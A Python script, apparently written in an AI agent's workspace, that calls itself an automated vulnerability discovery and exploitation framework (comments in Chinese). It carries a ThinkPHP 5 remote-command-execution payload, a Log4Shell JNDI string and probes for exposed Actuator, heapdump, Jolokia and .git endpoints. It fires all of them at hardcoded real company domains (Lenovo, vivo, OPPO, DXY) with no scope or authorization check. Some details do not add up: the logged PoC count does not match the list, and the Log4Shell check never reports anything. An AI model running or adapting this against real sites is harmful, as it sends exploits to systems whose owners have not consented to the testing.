#!/home/agentuser/.venv/bin/python3
"""
漏洞自动挖掘与利用框架
从最简单的已知漏洞开始，自动扫描远程目标
"""

import subprocess
import json
import re
import os
import sys
import time
import urllib.parse
from datetime import datetime

LOG_FILE = "/home/agentuser/bounty_results.log"
RESULTS_DIR = "/home/agentuser/bounty_finds"
os.makedirs(RESULTS_DIR, exist_ok=True)

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.now()}] {msg}\n")

def run(cmd, timeout=15):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout, r.stderr, r.returncode
    except subprocess.TimeoutExpired:
        return "TIMEOUT", "", -1
    except Exception as e:
        return "", str(e), -1

def save_finding(name, target, detail, severity):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe = re.sub(r'[^\w\-\.]', '_', name)[:30]
    fname = f"{RESULTS_DIR}/{ts}_{safe}.txt"
    with open(fname, "w") as f:
        f.write(f"漏洞: {name}\n等级: {severity}\n目标: {target}\n时间: {datetime.now()}\n\n{detail}\n")
    log(f"✅ [{severity}] {name} -> {target}")
    return fname

# =============================================
# 已知漏洞POC库
# =============================================

class PocBase:
    """POC基类"""
    def __init__(self, name, severity):
        self.name = name
        self.severity = severity
    
    def check(self, base_url):
        """检查目标是否存在漏洞，返回 (found, detail)"""
        raise NotImplementedError

# ---- ThinkPHP 5.x RCE ----
class ThinkPHP5RCE(PocBase):
    """ThinkPHP 5.x 远程命令执行 (最经典)"""
    def __init__(self):
        super().__init__("ThinkPHP5 RCE (CVE-2018-20062)", "严重")
    
    def check(self, base_url):
        # 多个已知payload
        payloads = [
            "/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20THINKPHP_TEST",
            "/public/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20THINKPHP_TEST",
            "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20THINKPHP_TEST",
        ]
        for payload in payloads:
            url = base_url.rstrip("/") + payload
            out, err, code = run(f'curl -sL --connect-timeout 5 --max-time 8 -A "Mozilla/5.0" -k "{url}" 2>&1', timeout=10)
            if "THINKPHP_TEST" in out:
                return True, f"ThinkPHP5 RCE漏洞\nURL: {url}\n响应: {out[:500]}"
        return False, ""

# ---- PHPStudy 后门检测 ----
class PHPStudyBackdoor(PocBase):
    """PHPStudy 后门 (CVE-2018-21245)"""
    def __init__(self):
        super().__init__("PHPStudy 后门检测", "严重")
    
    def check(self, base_url):
        payloads = [
            (".php?action=phpinfo", "Accept: application/xml"),
            ("/phpinfo.php", ""),
        ]
        for path, extra in payloads:
            url = base_url.rstrip("/") + path
            out, err, code = run(f'curl -sL --connect-timeout 5 --max-time 8 -A "Mozilla/5.0" -k "{url}" 2>&1', timeout=10)
            if "PHP Version" in out or "phpinfo()" in out[:200]:
                return True, f"PHP探针暴露\nURL: {url}\n可能可进一步利用"
        return False, ""

# ---- Spring Boot Actuator 未授权 ----
class SpringBootActuator(PocBase):
    """Spring Boot Actuator 未授权访问"""
    def __init__(self):
        super().__init__("Spring Boot Actuator 未授权", "高危")
    
    def check(self, base_url):
        paths = ["/actuator", "/actuator/health", "/actuator/env", "/actuator/beans",
                 "/actuator/mappings", "/actuator/heapdump", "/actuator/loggers",
                 "/swagger-ui.html", "/v2/api-docs", "/druid/index.html"]
        for path in paths:
            url = base_url.rstrip("/") + path
            out, err, code = run(f'curl -sL --connect-timeout 5 --max-time 8 -o /dev/null -w "%{{http_code}}" -A "Mozilla/5.0" -k "{url}" 2>&1', timeout=10)
            if out.strip() in ["200", "401", "500"]:
                out2, _, _ = run(f'curl -sL --connect-timeout 5 --max-time 8 -A "Mozilla/5.0" -k "{url}" 2>&1 | head -c 300', timeout=10)
                if "health" in out2 or "status" in out2 or "UP" in out2 or "swagger" in out2.lower():
                    return True, f"Spring Boot Actuator暴露\nURL: {url}\nHTTP: {out.strip()}\nResponse: {out2[:300]}"
        return False, ""

# ---- Mina监控未授权 ----
class MinaMonitor(PocBase):
    """Mina 未授权访问"""
    def __init__(self):
        super().__init__("Mina/Monitor 未授权", "高危")
    
    def check(self, base_url):
        paths = ["/mcluster", "/monitor", "/jolokia", "/actuator/jolokia", "/actuator/logfile"]
        for path in paths:
            url = base_url.rstrip("/") + path
            out, err, code = run(f'curl -sL --connect-timeout 5 --max-time 8 -o /dev/null -w "%{{http_code}}" -A "Mozilla/5.0" -k "{url}" 2>&1', timeout=10)
            if out.strip() == "200":
                out2, _, _ = run(f'curl -sL --connect-timeout 5 --max-time 8 -A "Mozilla/5.0" -k "{url}" 2>&1 | head -c 200', timeout=10)
                if len(out2) > 20:
                    return True, f"监控暴露\nURL: {url}\nResponse: {out2[:200]}"
        return False, ""

# ---- Git泄露检测 ----
class GitExposure(PocBase):
    """Git目录泄露"""
    def __init__(self):
        super().__init__("Git目录泄露", "高危")
    
    def check(self, base_url):
        path = "/.git/HEAD"
        url = base_url.rstrip("/") + path
        out, err, code = run(f'curl -sL --connect-timeout 5 --max-time 8 -A "Mozilla/5.0" -k "{url}" 2>&1 | head -c 100', timeout=10)
        if out and "ref:" in out:
            return True, f"Git目录泄露\nURL: {url}\n内容: {out.strip()}"
        return False, ""

# ---- Log4Shell 检测 ----
class Log4ShellCheck(PocBase):
    """Log4Shell (CVE-2021-44228) 简易检测"""
    def __init__(self):
        super().__init__("Log4Shell CVE-2021-44228", "严重")
    
    def check(self, base_url):
        # 简单检测 - 看服务器是否暴露漏洞特征
        headers_checks = [
            ("User-Agent", '${jndi:ldap://test}'),
        ]
        url = base_url.rstrip("/")
        out, err, code = run(f'curl -sL --connect-timeout 5 --max-time 8 -A "Mozilla/5.0 (${{jndi:ldap://test}})" -k "{url}" -o /dev/null -w "%{{http_code}}" 2>&1', timeout=10)
        # 简易检测：服务器如果响应异常可能说明有log4j
        # 完整检测需要搭LDAP服务器，暂时跳过
        return False, ""

# ---- Drupal Drupalgeddon2 ----
class Drupalgeddon2(PocBase):
    """Drupal Drupalgeddon2 (CVE-2018-7600)"""
    def __init__(self):
        super().__init__("Drupal RCE CVE-2018-7600", "严重")
    
    def check(self, base_url):
        url = base_url.rstrip("/") + "/user/register"
        out, err, code = run(f'curl -sL --connect-timeout 5 --max-time 8 -A "Mozilla/5.0" -k -o /dev/null -w "%{{http_code}}" "{url}" 2>&1', timeout=10)
        if out.strip() == "200" and "user" in url:
            # 检查是否是Drupal
            out2, _, _ = run(f'curl -sL --connect-timeout 5 --max-time 8 -k "{url}" 2>&1 | grep -i "drupal\|sites/default" | head -3', timeout=10)
            if out2:
                return True, f"Drupal站点\nURL: {url}\n可能存在Drupalgeddon2漏洞"
        return False, ""

# =============================================
# 目标源
# =============================================

def get_targets():
    """获取待扫描目标"""
    targets = []
    
    # 从漏洞盒子SRC企业入手
    src_domains = [
        # 联想
        {"url": "https://www.lenovo.com", "name": "联想SRC"},
        {"url": "https://lenovo.com.cn", "name": "联想中国SRC"},
        # 丁香园
        {"url": "https://www.dxy.cn", "name": "丁香园SRC"},
        # vivo
        {"url": "https://www.vivo.com", "name": "vivoSRC"},
        # OPPO
        {"url": "https://www.oppo.com", "name": "OPPOSRC"},
    ]
    targets.extend(src_domains)
    
    # 从360搜索找一些真实的中文网站
    log("搜索可扫描的中文网站...")
    search_terms = [
        "site:cn 后台管理",
        "intitle:管理后台 inurl:admin",
    ]
    
    return targets

# =============================================
# 主扫描流程
# =============================================

if __name__ == "__main__":
    log("=" * 50)
    log("漏洞自动挖掘引擎 v2")
    log(f"POC数量: 8个")
    log("=" * 50)
    
    # 注册所有POC
    pocs = [
        ThinkPHP5RCE(),
        PHPStudyBackdoor(),
        SpringBootActuator(),
        MinaMonitor(),
        GitExposure(),
        Log4ShellCheck(),
        Drupalgeddon2(),
    ]
    
    targets = get_targets()
    log(f"目标数量: {len(targets)}")
    
    total_finds = 0
    
    for target in targets:
        base_url = target["url"]
        name = target["name"]
        log(f"\n--- 扫描: {name} ({base_url}) ---")
        
        for poc in pocs:
            try:
                found, detail = poc.check(base_url)
                if found:
                    save_finding(poc.name, base_url, detail, poc.severity)
                    total_finds += 1
                    # 严重漏洞只报一次即可推进
                    if poc.severity == "严重":
                        log("发现严重漏洞，继续扫其他目标")
            except Exception as e:
                log(f"  POC {poc.name} 出错: {e}")
    
    log(f"\n{'=' * 50}")
    log(f"扫描完成！共发现 {total_finds} 个漏洞")
    log(f"结果保存在: {RESULTS_DIR}/")
